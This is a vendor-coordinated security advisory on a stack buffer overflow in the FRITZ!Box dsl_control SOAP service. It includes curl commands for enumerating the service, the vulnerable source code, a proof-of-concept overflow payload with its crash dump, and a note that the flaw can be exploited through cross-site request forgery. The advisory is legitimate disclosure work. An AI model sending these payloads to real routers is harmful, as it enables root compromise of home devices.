Advisory: AVM FRITZ!Box: Remote Code Execution via Buffer Overflow

RedTeam Pentesting discovered that several models of the AVM FRITZ!Box
are vulnerable to a stack-based buffer overflow, which allows attackers
to execute arbitrary code on the device.


Details
=======

Product: AVM FRITZ!Box 3272/7272, 3370/3390/3490, 7312/7412,
                       7320/7330 (SL), 736x (SL) and 7490
Affected Versions: versions prior to 6.30 (all models) [0]
Fixed Versions: >= 6.30 (all models) [0]
Vulnerability Type: Buffer Overflow
Security Risk: high
Vendor URL: http://avm.de/
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-001
Advisory Status: published
CVE: GENERIC-MAP-NOMATCH
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH


Introduction
============

FRITZ!Box is the brand name of SOHO routers/CPEs manufactured by AVM
GmbH. The FRITZ!Box usually combines features such as an xDSL modem, a
wifi access point, routing, VoIP, NAS and DECT.


More Details
============

When examining the running processes on a FRITZ!Box, it was discovered
that the program dsl_control listens on TCP port 8080:

# netstat -anp | grep dsl_control
tcp   0   0 0.0.0.0:8080   0.0.0.0:*   LISTEN   849/dsl_control

By sending an HTTP request to the service, it can be seen in the
server's response that the daemon expects SOAP messages (output
shortened):

$ curl --silent http://fritz.box:8080/ | xmllint -format -
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope [...]>
  <SOAP-ENV:Body>
    <SOAP-ENV:Fault SOAP-ENV:encodingStyle="[...]">
      <faultcode>SOAP-ENV:Client</faultcode>
      <faultstring>HTTP GET method not implemented</faultstring>
    </SOAP-ENV:Fault>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>

After examining the dsl_control binary by using GNU strings and
performing a web search for some of the resulting values, it was quickly
discovered that parts of the daemon's source code can be found in the
Git repository of the dd-wrt firmware[1].

In order to retrieve the list of all commands that are implemented by
the daemon, the following SOAP message can be sent to the server,
specifying an ifx:DslCpeCliAccess element containing an empty command
element (output shortened):

$ curl --silent http://fritz.box:8080/ --data '
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/[...]"
 xmlns:ifx="urn:dsl_api">
  <SOAP-ENV:Body>
      <ifx:DslCpeCliAccess>
          <command></command>
      </ifx:DslCpeCliAccess>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>' | xmllint -format -
<?xml version="1.0" encoding="UTF-8"?>
[...]
    <ifx:DslCpeCliAccessResponse>
      <result>avmcr, avmcrmr, avmcrms, avmcw, avmdsmmcs, avmhwrfit,
avmpet, avmvig, acog, acos, acs, alf, asecg, asecs, asg, aufg, alig,
bbsg, bpstg, bpsg, ccadbgmlg, ccadbgmls, dbgmlg, dbgmls, dsmcg, dsmcs,
dsmmcg, dsmmcs, dsmstatg, dsmsg, dsnrg, dmms, dms, esmcg, esmcs, fddg,
fdsg, fpsg, g997amdpfcg, g997amdpfcs, g997amlfcg, g997amlfcs, g997bang,
g997bansg, g997cdrtcg, g997cdrtcs, g997csg, g997dpfsg, g997dfr,
g997dhling, g997dhlinsg, g997dhlogg, g997dqlng, g997dsnrg, g997fpsg,
g997gang, g997gansg, g997lstg, g997lacg, g997lacs, g997lfsg, g997lisg,
g997lig, g997listrg, g997lis, g997lsg, g997lspbg, g997ltsg, g997lpmcg,
g997lpmcs, g997pmsft, g997pmsg, g997racg, g997racs, g997sang, g997sansg,
g997upbosg, g997xtusecg, g997xtusecs, g997xtusesg, help, hsdg, ics, isg,
lecg, lfcg, lfcs, lfsg, locg, locs, lsg, llsg, llcg, llcs, mlsg, nsecg,
nsecs, osg, pm15meet, pmbms, pmcc15mg, pmcc1dg, pmccsg, pmcctg,
pmchs15mg, pmchs1dg, pmct15mg, pmct15ms, pmct1dg, pmct1ds, pmcg, pmcs,
pmdpc15mg, pmdpc1dg, pmdpcsg, pmdpctg, pmdpfc15mg, pmdpfc1dg, pmdpfcsg,
pmdpfctg, pmdpfhs15mg, pmdpfhs1dg, pmdphs15mg, pmdphs1dg, pmdpt15mg,
pmdpt15ms, pmdpt1dg, pmdpt1ds, pmetr, pmlesc15mg, pmlesc1dg, pmlescsg,
pmlesctg, pmleshs15mg, pmleshs1dg, pmlic15mg, pmlic1dg, pmlicsg,
pmlictg, pmlihs15mg, pmlihs1dg, pmlit15mg, pmlit15ms, pmlit1dg,
pmlit1ds, pmlsc15mg, pmlsc1dg, pmlscsg, pmlsctg, pmlshs15mg, pmlshs1dg,
pmlst15mg, pmlst15ms, pmlst1dg, pmlst1ds, pmrtc15mg, pmrtc1dg, pmrtcsg,
pmrtctg, pmrths15mg, pmrths1dg, pmrtt15mg, pmrtt15ms, pmrtt1dg,
pmrtt1ds, pmr, pmsmg, pmsms, ptsg, quit, rtsg, rccg, rccs, rsss, rusg,
se, sicg, sics, sisg, tcpmistart, tcpmistop, tmcs, tmsg, vig, </result>
    </ifx:DslCpeCliAccessResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>

As can be seen in the listing, the server implements several commands.
Many of them can be accessed without any authentication. One of the
commands which was further examined is the 'se' or 'ScriptExecute'
command. It is defined by the file dsl_cpe_cli_access.c, which registers
the function DSL_CPE_CLI_ScriptExecute as the corresponding handler:

[...]
   DSL_CPE_CLI_CMD_ADD_COMM (
      "se",
      "ScriptExecute",
      DSL_CPE_CLI_ScriptExecute,
      g_sSe);
[...]

The following listing shows dd-wrt's implementation of the command,
which is also part of the file dsl_cpe_cli_access.c (shortened):

DSL_CLI_LOCAL DSL_int_t DSL_CPE_CLI_ScriptExecute(
   DSL_int_t fd,
   DSL_char_t *pCommands,
   DSL_CPE_File_t *out)
{
   DSL_int_t ret = 0;
   DSL_char_t sFileName[DSL_MAX_COMMAND_LINE_LENGTH] = {0};

   if (DSL_CPE_CLI_CheckParamNumber(pCommands, 1, DSL_CLI_EQUALS) ==
      DSL_FALSE)
   {
      return -1;
   }

   DSL_CPE_sscanf (pCommands, "%s", sFileName);

   [...]

   return 0;
}

As can be seen in the listing, the function first checks whether
another parameter is given by calling the function
DSL_CPE_CLI_CheckParamNumber(). If this is the case, the code proceeds
to call the function DSL_CPE_sscanf() in order to copy the value of the
parameter pCommands to the local char array sFileName. Because the
format string "%s" is provided to the DSL_CPE_sscanf() function, no
restriction applies to how much data is copied to the array. Therefore,
an overlong argument passed to the function may possibly exceed the
array's bounds, leading to a buffer overflow. In order to verify that
this is the case, the following SOAP message was stored in the file
trigger.xml, containing 300 capital A characters as the argument for the
'se' command (output shortened):

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/[...]/"
 xmlns:ifx="urn:dsl_api">
  <SOAP-ENV:Body>
      <ifx:DslCpeCliAccess>
          <command>se AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</command>
      </ifx:DslCpeCliAccess>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>

Afterwards, curl was used to send the SOAP message to the service:

$ curl --data @trigger.xml http://fritz.box:8080/
curl: (52) Empty reply from server

As indicated by curl's output, no HTTP reply was received. Instead, the
connection was closed. When accessing the device by using telnet, the
following crash dump is printed when sending the request, clearly
showing that the presumed buffer overflow was triggered:

dsl_control[841] crashed at 41414140 [...] accessing 0x41414140
Version: 06.24
at: 2ac783d8 v0: 00000000 v1: ffffffff
a0: 2ac0ac08 a1: 00000001 a2: 00473420 a3: 00000001
t0: 2aab5280 t1: 8ead1b2c t2: 41414141 t3: 41414141
t4: 41414141 t5: 00000001 t6: 2ac4d788 t7: 41414141
s0: 41414141 s1: 41414141 s2: 00000000 s3: 2ad800b0
s4: 2ad800b0 s5: 00000000 s6: 00080000 s7: 2ab52358
t8: 00000000 t9: 2ab3dc10
gp: 00473420 sp: 2ad7fcd0 fp: 2ad7ffe0 ra: 41414141

As seen in the crash dump, several saved registers were overwritten by
the capital 'A' characters (0x41) provided in the SOAP message. Among
those registers is the ra register, which stores the return address of
the current function call, thus allowing an attacker to directly alter
the control flow. This behaviour can be exploited in order to execute
arbitrary code. Due to firewall restrictions, the service is only
accessible from within the internal network connected to the FRITZ!Box.
However, it is also possible to exploit this vulnerability by utilising
cross-site request forgery, allowing typical "drive-by" exploitation
through a user's web browser.


Workaround
==========

None.


Fix
===

Affected users should upgrade to a fixed firmware version as soon as
possible.


Security Risk
=============

After successful exploitation, attackers gain root privileges on the
attacked device. This allows attackers to eavesdrop on traffic and to
initiate and receive arbitrary phone calls, if the device is configured
for telephony. Furthermore, backdoors may be installed to allow
persistent access to the device.

In order to exploit the vulnerability, attackers either need to be able
to connect to the service directly, i.e. from the LAN, or indirectly via
an attacker-controlled website, that is visited by a FRITZ!Box user.
This website can exploit the vulnerability via cross-site request
forgery, connecting to the service via the attacked user's browser.
Therefore, it is estimated that the vulnerability poses a high risk.


Timeline
========

2015-02-26 Vulnerability identified
2015-03-26 CVE number requested
2015-03-26 Vendor notified
2015-04-30 RedTeam Pentesting reviewed fixed version by order of vendor
2015-06-09 Vendor released fixed public beta (7490)
2015-07-16 Vendor started releasing fixed versions (7360 and 7490)
2015-10-01 Vendor finished releasing fixed versions (other models [0])
2015-11-27 Advisory release postponed to maximize patch distribution
2016-01-07 Advisory released


References
==========

[0] https://avm.de/service/sicherheitshinweise/
[1] https://github.com/mirror/dd-wrt/tree/master/src/router/dsl_cpe_control


RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests performed by a
team of specialised IT-security experts. Hereby, security weaknesses in
company networks or products are uncovered and can be fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at:
https://www.redteam-pentesting.de/

-- RedTeam Pentesting GmbH Tel.: +49 241 510081-0 
Dennewartstr. 25-27 Fax : +49 241 510081-99 
52068 Aachen https://www.redteam-pentesting.de 
Germany Registergericht: Aachen HRB 14004 
Geschäftsführer: Patrick Hof, Jens Liebchen